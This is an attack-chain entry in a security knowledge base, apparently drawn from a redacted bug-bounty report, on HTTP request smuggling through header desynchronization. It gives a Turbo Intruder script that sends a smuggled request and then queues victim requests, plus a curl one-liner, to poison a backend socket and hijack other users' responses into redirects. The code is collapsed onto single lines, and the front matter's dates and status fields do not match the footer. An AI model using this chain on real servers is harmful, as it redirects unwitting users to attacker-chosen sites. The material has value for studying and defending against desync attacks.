---
tags:
  - http-request-smuggling
  - desync
  - response-hijacking
  - web-vulnerability
type: attack_chain
tools:
  - '[[tools/Turbo-Intruder]]'
  - '[[tools/Burp-Collaborator]]'
  - '[[tools/cURL]]'
  - '[[tools/ncat]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/turbo-intruder-http-smuggling-script]]'
  - '[[commands/dns-a-records-listing]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Exploit-HTTP-Request-Smuggling-with-Turbo-Intruder]]'
  - '[[procedures/Queue-Victim-Requests-for-Poisoned-Response-Observation]]'
  - '[[procedures/Manual-Replication-of-HTTP-Desync-with-cURL-and-ncat]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Exploitation of HTTP Request Smuggling vulnerability through header
  desynchronization to hijack user responses and redirect to malicious sites.
skill_level: intermediate
impact_level: high
id: a89e020c-5e8e-4e1c-9928-cc9ea598af65
created_at: '2025-12-13T09:01:22.020Z'
updated_at: '2025-12-13T09:01:22.020Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# HTTP Request Smuggling via Header Desync for Response Hijacking

Multi-stage attack chain demonstrating exploitation of HTTP Request Smuggling by desynchronizing frontend and backend request parsing, leading to backend socket poisoning and response hijacking for redirecting users to malicious sites.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Attack Request] --> B[Queue Victim Requests]
    B --> C[Manual Replication]
    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Turbo-Intruder]]
- [[tools/Burp-Collaborator]]
- [[tools/cURL]]
- [[tools/ncat]]

### Target Environment

- Web platform
- Open port 443
- Vulnerable endpoint at /████ on stage.████████

### Initial Access Requirements

- Network access to the target URL https://██████████:443
- No credentials required (unauthenticated)

## Detailed Attack Procedures

### Step 1: Setup and Send Attack Request
procedure: [[procedures/Exploit-HTTP-Request-Smuggling-with-Turbo-Intruder]]

**Objective**: Craft and send a request to exploit the desync by using \n in headers to poison the backend socket.

**Instructions**: Use [[commands/turbo-intruder-http-smuggling-script]] to queue the attack request:

```python
def queueRequests(target, wordlists): engine = RequestEngine(endpoint='https://██████████:443', concurrentConnections=5, requestsPerConnection=1, pipeline=False, maxRetriesPerRequest=0 ) engine.start() attack = '''POST /████ HTTP/1.1 Fooz: bar\nTransfer-Encoding: chunked Host: stage.█████ Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 77 Foo: bar 220 24GET███████ HTTP/1.1 X: X''' engine.queue(attack) victim = '''GET /foo.jpg?x=%s HTTP/1.1 Host: stage.████████ Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: keep-alive ''' for i in range(15): engine.queue(victim, i) time.sleep(0.2) def handleResponse(req, interesting): table.add(req)
```

**Expected Output**: Backend socket poisoned with smuggled request.

**Success Indicators**:
- Attack request queued successfully
- No immediate errors in Turbo Intruder

### Step 2: Queue Victim Requests
procedure: [[procedures/Queue-Victim-Requests-for-Poisoned-Response-Observation]]

**Objective**: Simulate legitimate user traffic to observe the poisoned response, such as a redirect.

**Instructions**: Continue with the Turbo Intruder script to queue multiple victim requests, observing one as a 302 redirect.

Use the victim part of [[commands/turbo-intruder-http-smuggling-script]]:

```python
victim = '''GET /foo.jpg?x=%s HTTP/1.1 Host: stage.████████ Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: keep-alive ''' for i in range(15): engine.queue(victim, i) time.sleep(0.2)
```

**Expected Output**: One victim response is a 302 redirect to █████████.

**Success Indicators**:
- Redirect observed in responses
- Confirmation of response hijacking

### Step 3: Manual Replication
procedure: [[procedures/Manual-Replication-of-HTTP-Desync-with-cURL-and-ncat]]

**Objective**: Optionally replicate the desync manually to verify without scripting.

**Instructions**: Use [[tools/cURL]] or [[tools/ncat]] to send the desync requests mimicking the script.

For example, with cURL:

```bash
curl -H "Fooz: bar\nTransfer-Encoding: chunked" --data "chunked body with smuggled GET" https://stage.████████/████
```

**Expected Output**: Similar desync behavior and poisoned socket.

**Success Indicators**:
- Manual request triggers desync
- Response hijacking replicated

## Attack Chain Summary

### Key Achievements

1. Successful poisoning of backend socket
2. Hijacking of user responses leading to redirects
3. Potential for further attacks like response manipulation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

*Last updated: 2023-10-01*
